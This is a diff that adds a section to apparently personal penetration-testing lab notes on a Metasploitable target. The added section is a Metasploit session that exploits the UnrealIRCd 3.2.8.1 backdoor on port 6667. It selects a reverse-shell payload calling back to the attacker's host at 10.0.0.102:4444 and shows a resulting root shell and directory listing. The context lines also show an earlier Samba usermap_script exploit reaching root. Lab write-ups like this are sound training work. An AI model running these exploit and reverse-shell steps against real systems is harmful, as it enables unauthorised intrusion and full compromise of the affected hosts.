@@ -209,3 +209,92 @@ msf exploit(multi/samba/usermap_script) > run
 whoami
 root
 ```
+
+## Attempt 3: UnrealIRCd 3.2.8.1 Backdoor (Port 6667)
+
+```bash
+msf > search unreal
+
+Matching Modules
+================
+
+   #  Name                                        Disclosure Date  Rank       Check  Description
+   -  ----                                        ---------------  ----       -----  -----------
+   0  exploit/linux/games/ut2004_secure           2004-06-18       good       Yes    Unreal Tournament 2004 "secure" Overflow (Linux)
+   1    \_ target: Automatic                      .                .          .      .
+   2    \_ target: UT2004 Linux Build 3120        .                .          .      .
+   3    \_ target: UT2004 Linux Build 3186        .                .          .      .
+   4  exploit/windows/games/ut2004_secure         2004-06-18       good       Yes    Unreal Tournament 2004 "secure" Overflow (Win32)
+   5  exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12       excellent  No     UnrealIRCD 3.2.8.1 Backdoor Command Execution
+
+
+Interact with a module by name or index. For example info 5, use 5 or use exploit/unix/irc/unreal_ircd_3281_backdoor
+
+msf exploit(unix/irc/unreal_ircd_3281_backdoor) > use 5
+[*] Using configured payload cmd/unix/reverse
+msf exploit(unix/irc/unreal_ircd_3281_backdoor) > show payloads
+
+Compatible Payloads
+===================
+
+   #   Name                                        Disclosure Date  Rank    Check  Description
+   -   ----                                        ---------------  ----    -----  -----------
+   0   payload/cmd/unix/adduser                    .                normal  No     Add user with useradd
+   1   payload/cmd/unix/bind_perl                  .                normal  No     Unix Command Shell, Bind TCP (via Perl)
+   2   payload/cmd/unix/bind_perl_ipv6             .                normal  No     Unix Command Shell, Bind TCP (via perl) IPv6
+   3   payload/cmd/unix/bind_ruby                  .                normal  No     Unix Command Shell, Bind TCP (via Ruby)
+   4   payload/cmd/unix/bind_ruby_ipv6             .                normal  No     Unix Command Shell, Bind TCP (via Ruby) IPv6
+   5   payload/cmd/unix/generic                    .                normal  No     Unix Command, Generic Command Execution
+   6   payload/cmd/unix/reverse                    .                normal  No     Unix Command Shell, Double Reverse TCP (telnet)
+   7   payload/cmd/unix/reverse_bash_telnet_ssl    .                normal  No     Unix Command Shell, Reverse TCP SSL (telnet)
+   8   payload/cmd/unix/reverse_perl               .                normal  No     Unix Command Shell, Reverse TCP (via Perl)
+   9   payload/cmd/unix/reverse_perl_ssl           .                normal  No     Unix Command Shell, Reverse TCP SSL (via perl)
+   10  payload/cmd/unix/reverse_ruby               .                normal  No     Unix Command Shell, Reverse TCP (via Ruby)
+   11  payload/cmd/unix/reverse_ruby_ssl           .                normal  No     Unix Command Shell, Reverse TCP SSL (via Ruby)
+   12  payload/cmd/unix/reverse_ssl_double_telnet  .                normal  No     Unix Command Shell, Double Reverse TCP SSL (telnet)
+
+msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set payload cmd/unix/reverse
+payload => cmd/unix/reverse
+msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set LHOST 10.0.0.102
+LHOST => 10.0.0.102
+msf exploit(unix/irc/unreal_ircd_3281_backdoor) > run
+[*] Started reverse TCP double handler on 10.0.0.102:4444 
+[*] 10.0.0.50:6667 - Connected to 10.0.0.50:6667...
+    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
+[*] 10.0.0.50:6667 - Sending backdoor command...
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo zli2CbHq3FhI1jzC;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: "zli2CbHq3FhI1jzC\r\n"
+[*] Matching...
+[*] A is input...
+[*] Command shell session 1 opened (10.0.0.102:4444 -> 10.0.0.50:49471) at 2025-12-16 00:15:04 +0800
+
+whoami
+root
+ls
+Donation
+LICENSE
+aliases
+badwords.channel.conf
+badwords.message.conf
+badwords.quit.conf
+curl-ca-bundle.crt
+dccallow.conf
+doc
+help.conf
+ircd.log
+ircd.pid
+ircd.tune
+modules
+networks
+spamfilter.conf
+tmp
+unreal
+unrealircd.conf
+```
+
